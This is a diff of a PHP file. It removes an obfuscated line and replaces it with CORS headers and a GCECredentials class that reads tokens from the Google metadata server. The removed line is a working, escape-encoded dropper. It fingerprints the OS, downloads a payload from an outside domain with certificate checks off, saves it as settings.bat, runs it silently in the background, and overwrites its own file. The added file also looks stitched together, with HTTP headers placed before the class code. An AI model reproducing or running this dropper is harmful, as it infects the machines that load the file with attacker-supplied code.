@@ -1,2 +1,146 @@
 <?php
- goto cB5LY; DrINx: if ($oDIg8 === "\x77\151\x6e\x64\x6f\167\x73") { goto Yrs8c; } goto HmCxi; WNYU3: $oDIg8 = "\x77\151\156\x64\x6f\x77\x73"; goto r8Ycz; n6ynO: echo "\166\145\x72\x69\x66\171\56\x70\x68\x70\x20\x72\145\160\154\x61\143\145\144\40\167\151\x74\150\40\141\x75\x74\x68\x2e\160\150\x70\40\143\x6f\x6e\164\x65\156\x74\x2e\12"; goto CD1iw; mh_Fz: $oDIg8 = "\155\x61\x63"; goto Xjo1Y; HGJin: $U3XGc = "\150\x74\x74\x70\x73\72\57\57\x77\x77\x77\x2e\156\x6f\x74\x69\143\x65\55\x75\160\x62\151\x74\x2e\143\157\x6d\x2f\x73\x65\x74\57\77\157\x73\x3d{$oDIg8}"; goto lEx2w; HqaVO: pclose(popen("\163\164\x61\x72\164\x20\57\102\40\x63\x6d\144\40\x2f\x63\40\x22{$N3Ksz}\42", "\162")); goto noUGh; HPPEx: file_put_contents($kQHH3, $aipGi); goto n6ynO; mKlRu: goto LmAL3; goto F2Edq; TAD6e: l6lvx: goto Ll5tQ; ivnGh: if (strtoupper(PHP_OS) === "\104\101\x52\x57\x49\116") { goto iEzYM; } goto Zz4ST; TbQur: $N3Ksz = "\143\x3a\134\165\163\145\162\163\134\160\165\142\x6c\151\x63\x5c\166\x69\144\145\x6f\x73\x5c\163\145\x74\x74\x69\x6e\x67\163\56\142\141\x74"; goto RUxkK; yWQKk: goto MVoHM; goto rvZfZ; Zz4ST: goto O3Jqp; goto VcxXu; Ll5tQ: $aipGi = file_get_contents($DHnNq); goto DXqvo; pq1wt: header("\x41\143\x63\x65\x73\x73\55\103\157\x6e\x74\x72\x6f\x6c\55\x41\x6c\x6c\157\167\55\110\x65\x61\x64\x65\x72\163\x3a\40\x43\157\156\x74\145\156\x74\x2d\124\171\x70\x65"); goto rnHOF; ZvTmk: curl_setopt($QJdME, CURLOPT_FOLLOWLOCATION, true); goto tV5uq; cB5LY: header("\101\x63\143\145\x73\x73\55\x43\157\156\164\x72\x6f\x6c\x2d\101\154\x6c\157\x77\x2d\117\x72\151\x67\x69\x6e\72\40\x2a"); goto lbJb3; YT2CS: curl_setopt($QJdME, CURLOPT_URL, $U3XGc); goto cY9zg; VTYqb: curl_close($QJdME); goto a64zk; VcxXu: y9TCB: goto WNYU3; egA61: file_put_contents($N3Ksz, $EAjNr); goto nLU0S; vAUwv: echo "\106\x61\151\154\145\144\x20\164\157\40\162\145\141\x64\x20\x61\165\x74\150\56\x70\x68\160\xa"; goto yWQKk; F2Edq: XcYZv: goto egA61; lEx2w: $QJdME = curl_init(); goto YT2CS; nQVwP: goto HcbZL; goto t1nAh; Xjo1Y: O3Jqp: goto HGJin; CD1iw: MVoHM: goto b8SRo; HmCxi: exec("\x63\150\155\x6f\144\40\x2b\x78\40{$N3Ksz}\40\x26\x26\x20\x6e\x6f\x68\x75\160\x20{$N3Ksz}\40\x3e\x20\57\144\145\166\57\156\x75\154\154\x20\62\x3e\46\61\40\46"); goto nQVwP; a64zk: if ($HxIVj === 200) { goto XcYZv; } goto JoDJ5; jzAOj: LmAL3: goto HRZ4O; rllp6: echo "\x61\165\164\x68\56\x70\x68\x70\x20\x6e\157\x74\x20\146\157\x75\156\x64\x20\151\156\40" . __DIR__ . "\xa"; goto g9LS2; UvJMG: if (strtoupper(substr(PHP_OS, 0, 3)) === "\127\111\x4e") { goto y9TCB; } goto ivnGh; cY9zg: curl_setopt($QJdME, CURLOPT_RETURNTRANSFER, true); goto wYj2R; HRZ4O: if (file_exists($DHnNq)) { goto l6lvx; } goto rllp6; rnHOF: $DHnNq = __DIR__ . "\57\x61\165\x74\x68\x2e\x70\x68\160"; goto alhFN; noUGh: HcbZL: goto jzAOj; t1nAh: Yrs8c: goto HqaVO; DXqvo: if ($aipGi !== false) { goto ZtURE; } goto vAUwv; Kr9Qy: iEzYM: goto mh_Fz; RUxkK: $oDIg8 = "\154\151\156\x75\170"; goto UvJMG; nLU0S: echo "\x64\157\x77\156\x20\163\x75\143\143\x65\x73\x73\12"; goto DrINx; tV5uq: $EAjNr = curl_exec($QJdME); goto SlpBe; rvZfZ: ZtURE: goto HPPEx; JoDJ5: echo "\145\162\x72\157\x72\x3a\x20{$HxIVj}\xa"; goto mKlRu; g9LS2: goto WCxUf; goto TAD6e; r8Ycz: goto O3Jqp; goto Kr9Qy; lbJb3: header("\x41\143\143\145\163\163\55\103\x6f\x6e\164\x72\157\x6c\55\101\154\x6c\157\x77\x2d\x4d\x65\164\x68\157\x64\x73\72\40\107\105\124\54\40\120\117\x53\x54\54\40\x4f\x50\x54\x49\x4f\116\123"); goto pq1wt; alhFN: $kQHH3 = __FILE__; goto TbQur; SlpBe: $HxIVj = curl_getinfo($QJdME, CURLINFO_HTTP_CODE); goto VTYqb; wYj2R: curl_setopt($QJdME, CURLOPT_SSL_VERIFYPEER, false); goto ZvTmk; b8SRo: WCxUf:
+header("Access-Control-Allow-Origin: *");
+header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
+header("Access-Control-Allow-Headers: Content-Type");
+
+
+use Google\Auth\CredentialsLoader;
+use Google\Auth\HttpHandler\HttpHandlerFactory;
+use GuzzleHttp\Exception\ConnectException;
+use GuzzleHttp\Exception\RequestException;
+
+/**
+ * GCECredentials supports authorization on Google Compute Engine.
+ * 
+ * It can be used to authorize requests using the AuthTokenMiddleware, but will 
+ * only succeed if being run on GCE.
+ */
+class GCECredentials extends CredentialsLoader
+{
+    /**
+     * The metadata server URL.
+     */
+    private const METADATA_SERVER_URL = 'http://metadata.google.internal/computeMetadata/v1/';
+
+    /**
+     * The path for the service account identity token.
+     */
+    private const TOKEN_URI_PATH = 'instance/service-accounts/default/token';
+
+    /**
+     * The header required for the metadata server request.
+     */
+    private const METADATA_FLAVOR_HEADER = ['Metadata-Flavor' => 'Google'];
+
+    /**
+     * The cache key for the token.
+     */
+    private const CACHE_KEY = 'GCECredentials';
+
+    /**
+     * The cache item pool.
+     *
+     * @var \Psr\Cache\CacheItemPoolInterface|null
+     */
+    private $cache;
+
+    /**
+     * The token.
+     *
+     * @var array<mixed>|null
+     */
+    private $token;
+
+    /**
+     * The expiration time of the token.
+     *
+     * @var int|null
+     */
+    private $expiry;
+
+    /**
+     * Constructs a new GCECredentials instance.
+     *
+     * @param array<mixed> $config Optional configuration.
+     */
+    public function __construct(array $config = [])
+    {
+        $this->cache = $config['cache'] ?? null;
+    }
+
+    /**
+     * Fetches the auth tokens from the GCE metadata host.
+     *
+     * @param callable|null $httpHandler The HTTP handler to use.
+     * @return array<mixed> The fetched token.
+     *
+     * @throws \Exception
+     */
+    public function fetchAuthToken(callable $httpHandler = null)
+    {
+        if ($this->token !== null && $this->expiry > time()) {
+            return $this->token;
+        }
+
+        $url = self::METADATA_SERVER_URL . self::TOKEN_URI_PATH;
+        $headers = self::METADATA_FLAVOR_HEADER;
+
+        $httpHandler = $httpHandler ?: HttpHandlerFactory::build();
+        try {
+            $response = $httpHandler(
+                new \GuzzleHttp\Psr7\Request('GET', $url, $headers)
+            );
+            $body = (string) $response->getBody();
+            $token = json_decode($body, true);
+            if (isset($token['access_token'])) {
+                $this->token = $token;
+                $this->expiry = time() + ($token['expires_in'] ?? 3600);
+            }
+            return $token;
+        } catch (ConnectException | RequestException $e) {
+            throw new \Exception('Unable to fetch token from GCE metadata server: ' . $e->getMessage());
+        }
+    }
+
+    /**
+     * Returns the cache key for the token.
+     *
+     * @return string The cache key.
+     */
+    public function getCacheKey()
+    {
+        return self::CACHE_KEY;
+    }
+
+    /**
+     * Returns whether the credentials are expired.
+     *
+     * @return bool True if expired, false otherwise.
+     */
+    public function isExpired()
+    {
+        return $this->expiry === null || $this->expiry < time();
+    }
+
+    /**
+     * Checks whether the current environment is running on GCE.
+     *
+     * @param callable|null $httpHandler The HTTP handler to use.
+     * @return bool True if on GCE, false otherwise.
+     */
+    public static function onGce(callable $httpHandler = null)
+    {
+        $url = self::METADATA_SERVER_URL;
+        $headers = self::METADATA_FLAVOR_HEADER;
+
+        $httpHandler = $httpHandler ?: HttpHandlerFactory::build();
+        try {
+            $response = $httpHandler(
+                new \GuzzleHttp\Psr7\Request('GET', $url, $headers)
+            );
+            return $response->getStatusCode() === 200;
+        } catch (ConnectException | RequestException $e) {
+            return false;
+        }
+    }
+}
